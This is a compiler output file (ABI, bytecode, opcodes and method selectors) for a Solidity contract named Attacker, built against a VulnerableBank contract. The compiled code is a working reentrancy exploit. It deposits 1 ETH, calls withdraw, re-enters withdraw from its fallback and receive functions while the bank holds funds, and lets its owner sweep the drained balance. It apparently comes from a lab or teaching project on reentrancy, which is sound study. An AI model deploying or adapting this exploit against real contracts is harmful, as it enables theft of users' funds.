{"contracts/Attacker.sol":{"Attacker":{"abi":[{"inputs":[{"internalType":"address","name":"_vulnerableBankAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"stateMutability":"payable","type":"fallback"},{"inputs":[],"name":"ATTACK_AMOUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"attack","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"attackCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"vulnerableBank","outputs":[{"internalType":"contract VulnerableBank","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdrawFunds","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}],"evm":{"bytecode":{"linkReferences":{},"object":"608060405234801561001057600080fd5b5060405161050938038061050983398101604081905261002f9161005d565b600080546001600160a01b039092166001600160a01b0319928316179055600180549091163317905561008d565b60006020828403121561006f57600080fd5b81516001600160a01b038116811461008657600080fd5b9392505050565b61046d8061009c6000396000f3fe6080604052600436106100745760003560e01c806389ea43e41161004e57806389ea43e4146101ca5780638da5cb5b146101e65780639e5faafc1461021e578063a1c9aee11461022657610113565b806312065fe01461017d57806324600fc31461019f578063407c2821146101b457610113565b36610113576002805490600061008983610410565b90915550506000546001600160a01b031631670de0b6b3a7640000811061011157600054604051632e1a7d4d60e01b8152670de0b6b3a764000060048201526001600160a01b0390911690632e1a7d4d906024015b600060405180830381600087803b1580156100f857600080fd5b505af115801561010c573d6000803e3d6000fd5b505050505b005b600054670de0b6b3a76400006001600160a01b039091163110610111576002805490600061014083610410565b9091555050600054604051632e1a7d4d60e01b8152670de0b6b3a764000060048201526001600160a01b0390911690632e1a7d4d906024016100de565b34801561018957600080fd5b50475b6040519081526020015b60405180910390f35b3480156101ab57600080fd5b50610111610246565b3480156101c057600080fd5b5061018c60025481565b3480156101d657600080fd5b5061018c670de0b6b3a764000081565b3480156101f257600080fd5b50600154610206906001600160a01b031681565b6040516001600160a01b039091168152602001610196565b6101116102e1565b34801561023257600080fd5b50600054610206906001600160a01b031681565b6001546001600160a01b031633146102a55760405162461bcd60e51b815260206004820152601760248201527f4f6e6c79206f776e65722063616e20776974686472617700000000000000000060448201526064015b60405180910390fd5b6001546040516001600160a01b03909116904780156108fc02916000818181858888f193505050501580156102de573d6000803e3d6000fd5b50565b670de0b6b3a76400003410156103395760405162461bcd60e51b815260206004820152601d60248201527f4e656564206174206c6561737420312045544820746f2061747461636b000000604482015260640161029c565b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561038f57600080fd5b505af11580156103a3573d6000803e3d6000fd5b5050600054604051632e1a7d4d60e01b8152670de0b6b3a764000060048201526001600160a01b039091169350632e1a7d4d92506024019050600060405180830381600087803b1580156103f657600080fd5b505af115801561040a573d6000803e3d6000fd5b50505050565b60006001820161043057634e487b7160e01b600052601160045260246000fd5b506001019056fea264697066735822122032b6459aa4d57dc5e920de2c04239769197548595816ae91894e75d75c1083a064736f6c63430008140033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x509 CODESIZE SUB DUP1 PUSH2 0x509 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH2 0x2F SWAP2 PUSH2 0x5D JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP3 DUP4 AND OR SWAP1 SSTORE PUSH1 0x1 DUP1 SLOAD SWAP1 SWAP2 AND CALLER OR SWAP1 SSTORE PUSH2 0x8D JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x86 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH2 0x46D DUP1 PUSH2 0x9C PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x74 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x89EA43E4 GT PUSH2 0x4E JUMPI DUP1 PUSH4 0x89EA43E4 EQ PUSH2 0x1CA JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x1E6 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x21E JUMPI DUP1 PUSH4 0xA1C9AEE1 EQ PUSH2 0x226 JUMPI PUSH2 0x113 JUMP JUMPDEST DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x17D JUMPI DUP1 PUSH4 0x24600FC3 EQ PUSH2 0x19F JUMPI DUP1 PUSH4 0x407C2821 EQ PUSH2 0x1B4 JUMPI PUSH2 0x113 JUMP JUMPDEST CALLDATASIZE PUSH2 0x113 JUMPI PUSH1 0x2 DUP1 SLOAD SWAP1 PUSH1 0x0 PUSH2 0x89 DUP4 PUSH2 0x410 JUMP JUMPDEST SWAP1 SWAP2 SSTORE POP POP PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE PUSH8 0xDE0B6B3A7640000 DUP2 LT PUSH2 0x111 JUMPI PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x2E1A7D4D PUSH1 0xE0 SHL DUP2 MSTORE PUSH8 0xDE0B6B3A7640000 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x2E1A7D4D SWAP1 PUSH1 0x24 ADD JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x10C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 SLOAD PUSH8 0xDE0B6B3A7640000 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND BALANCE LT PUSH2 0x111 JUMPI PUSH1 0x2 DUP1 SLOAD SWAP1 PUSH1 0x0 PUSH2 0x140 DUP4 PUSH2 0x410 JUMP JUMPDEST SWAP1 SWAP2 SSTORE POP POP PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x2E1A7D4D PUSH1 0xE0 SHL DUP2 MSTORE PUSH8 0xDE0B6B3A7640000 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x2E1A7D4D SWAP1 PUSH1 0x24 ADD PUSH2 0xDE JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x189 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP SELFBALANCE JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1AB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x111 PUSH2 0x246 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1C0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x18C PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1D6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x18C PUSH8 0xDE0B6B3A7640000 DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1F2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 SLOAD PUSH2 0x206 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x196 JUMP JUMPDEST PUSH2 0x111 PUSH2 0x2E1 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x232 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 SLOAD PUSH2 0x206 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x2A5 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x17 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F6E6C79206F776E65722063616E207769746864726177000000000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 SELFBALANCE DUP1 ISZERO PUSH2 0x8FC MUL SWAP2 PUSH1 0x0 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x2DE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x339 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1D PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4E656564206174206C6561737420312045544820746F2061747461636B000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x29C JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x38F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3A3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x2E1A7D4D PUSH1 0xE0 SHL DUP2 MSTORE PUSH8 0xDE0B6B3A7640000 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP4 POP PUSH4 0x2E1A7D4D SWAP3 POP PUSH1 0x24 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3F6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x40A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP3 ADD PUSH2 0x430 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x1 ADD SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 ORIGIN 0xB6 GASLIMIT SWAP11 LOG4 0xD5 PUSH30 0xC5E920DE2C04239769197548595816AE91894E75D75C1083A064736F6C63 NUMBER STOP ADDMOD EQ STOP CALLER "},"methodIdentifiers":{"ATTACK_AMOUNT()":"89ea43e4","attack()":"9e5faafc","attackCount()":"407c2821","getBalance()":"12065fe0","owner()":"8da5cb5b","vulnerableBank()":"a1c9aee1","withdrawFunds()":"24600fc3"}}}}}